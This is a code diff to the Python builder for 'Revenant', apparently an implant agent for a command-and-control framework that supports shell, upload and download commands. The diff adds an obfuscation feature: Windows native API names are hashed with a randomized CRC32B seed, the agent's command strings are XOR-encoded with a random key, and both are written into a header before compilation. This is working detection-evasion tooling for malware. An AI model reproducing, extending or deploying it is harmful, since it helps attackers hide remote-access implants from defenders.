@@ -1,3 +1,4 @@
+import binascii
 import subprocess
 import glob
 
@@ -16,12 +17,113 @@ COMMAND_OUTPUT: int = 0x200
 
 GENERATED_PASSWORD: str = ''.join(random.choices(string.ascii_letters, k=16))
 
+plain_strings = [
+    "#define SEED 0xDEADDEAD",
+    "#define RtlRandomEx_CRC32B             \"RtlRandomEx\"",
+    "#define RtlGetVersion_CRC32B           \"RtlGetVersion\"",
+    "#define RtlInitUnicodeString_CRC32B    \"RtlInitUnicodeString\"",
+    "#define NtCreateFile_CRC32b            \"NtCreateFile\"",
+    "#define NtQueryInformationFile_CRC32B  \"NtQueryInformationFile\"",
+    "#define NtAllocateVirtualMemory_CRC32B \"NtAllocateVirtualMemory\"",
+    "#define S_XK                     \"PUNICODE_STRING\"",
+    "#define S_INSTANCE_NOT_CONNECTED \"instance not connected!\"",
+    "#define S_COMMAND_NOT_FOUND      \"command not found\"",
+    "#define S_IS_COMMAND_NO_JOB      \"is command no job\"",
+    "#define S_TRANSPORT_FAILED       \"transport failed\"",
+    "#define S_COMMAND_SHELL          \"command shell\"",
+    "#define S_COMMAND_UPLOAD         \"command upload\"",
+    "#define S_COMMAND_DOWNLOAD       \"command download\"",
+    "#define S_COMMAND_EXIT           \"command exit\""
+]
+
+
+
+GENERATED_PASSWORD: str = ''.join(random.choices(string.ascii_letters, k=16))
+password_bytes = GENERATED_PASSWORD.encode('utf-8')
+password_hex = ", ".join(f"0x{b:02x}" for b in password_bytes)
+
+seed_str: str = ''.join(random.choices(string.ascii_letters, k=8))
+GENERATED_SEED = int(binascii.crc32(seed_str.encode())) # 0xDEADDEAD
+
+#     "#define SEED 0xDEADDEAD"
+#     "#define S_XK                     \"PUNICODE_STRING\""
+# print(GENERATED_SEED)
+# print(GENERATED_PASSWORD)
+
+
+plain_function_strings = [
+    "#define RtlRandomEx_CRC32B             \"RtlRandomEx\"",
+    "#define RtlGetVersion_CRC32B           \"RtlGetVersion\"",
+    "#define RtlInitUnicodeString_CRC32B    \"RtlInitUnicodeString\"",
+    "#define NtCreateFile_CRC32b            \"NtCreateFile\"",
+    "#define NtQueryInformationFile_CRC32B  \"NtQueryInformationFile\"",
+    "#define NtAllocateVirtualMemory_CRC32B \"NtAllocateVirtualMemory\""]
+
+plain_strings = [
+    "#define S_INSTANCE_NOT_CONNECTED \"instance not connected!\"",
+    "#define S_COMMAND_NOT_FOUND      \"command not found\"",
+    "#define S_IS_COMMAND_NO_JOB      \"is command no job\"",
+    "#define S_TRANSPORT_FAILED       \"transport failed\"",
+    "#define S_COMMAND_SHELL          \"command shell\"",
+    "#define S_COMMAND_UPLOAD         \"command upload\"",
+    "#define S_COMMAND_DOWNLOAD       \"command download\"",
+    "#define S_COMMAND_EXIT           \"command exit\""
+]
+
+
+def crc32b(s: str):
+    crc = 0xFFFFFFFF
+    i = 0
+    while i != len(s):
+        byte = s[i]
+        crc = crc ^ byte
+        for j in range(7, -1, -1):
+            mask = -1 * (crc & 1)
+            crc = (crc >> 1) ^ (GENERATED_SEED & mask)
+        i += 1
+    return ~crc & 0xFFFFFFFF
+
 
 def xor_encode(s: str) -> str:
     password_bytes: bytes = GENERATED_PASSWORD.encode()
     password_cycle: bytes = (password_bytes * (len(s) // len(password_bytes) + 1))[:len(s)]
     xor_bytes: bytes = bytes(b1 ^ b2 for b1, b2 in zip(s.encode(), password_cycle))
     return ", ".join(f"0x{b:02x}" for b in xor_bytes)
+
+
+def generate_crc32b_defs(plain_function_strings):
+    crc32b_defs = []
+    output_string = f"#define SEED {GENERATED_SEED}"
+    crc32b_defs.append(output_string)
+    for string in plain_function_strings:
+        # Extract function name from string definition
+        function_name = string.split()[2].strip('"')
+
+        # Calculate CRC32B hash of function name
+        crc32b_hash = hex(crc32b(function_name.encode()))
+
+        # Format output string with hash and original definition
+        output_string = f"#define {function_name}_CRC32B {crc32b_hash}"
+
+        # Add output string to list
+        crc32b_defs.append(output_string)
+
+    # Join all output strings into a single string with newline separators
+    return "\n".join(crc32b_defs)
+
+def encode_strings(strings):
+    encoded_strings = []
+    output = f"#define S_XK {{{password_hex}}}"
+    encoded_strings.append(output)
+    for s in strings:
+        # Extract the string contents
+        contents = s.split('"')[1]
+        # Apply XOR encoding
+        encoded = xor_encode(contents)
+        # Format the output string
+        output = f"#define {s.split()[1]} {{{encoded}}}"
+        encoded_strings.append(output)
+    return "\n".join(encoded_strings)
 
 
 def replace_in_file(filename, old_string, new_string):
@@ -33,6 +135,11 @@ def replace_in_file(filename, old_string, new_string):
         f.write(updated_file_contents)
 
 
+def process_strings_h():
+    strings_file = generate_crc32b_defs(plain_function_strings)+"\n"+encode_strings(plain_strings)
+    for filepath in glob.iglob('**/Strings.h', recursive=True):
+        with open(filepath, 'w') as f:
+            f.write(strings_file)
 def process_config_h(config: dict):
     config_user_agent:         str = config['Options']['Listener']['UserAgent']
     config_host_bind:          str = config['Options']['Listener']['HostBind']
@@ -157,7 +264,7 @@ class Revenant(AgentType):
     def __init__(self):
         self.Name: str = "Revenant"
         self.Author: str = "0xTriboulet for Malicious Group"
-        self.Version: str = "0.1"
+        self.Version: str = "0.2"
         self.Description: str = "Revenant Agent Testing"
         self.MagicValue = 0x72766e74
 
@@ -191,6 +298,11 @@ class Revenant(AgentType):
 
         print("[*] Configuring Config.h header...")
         process_config_h(config)
+
+        if self.BuildingConfig["Obfuscation"]:
+            process_strings_h()
+            print("[*] Configuring String.h header...")
+
         # compile_command: str = "cd ./Agent && make"
         compile_command: str = "cmake . && cmake --build . -j 1"
 
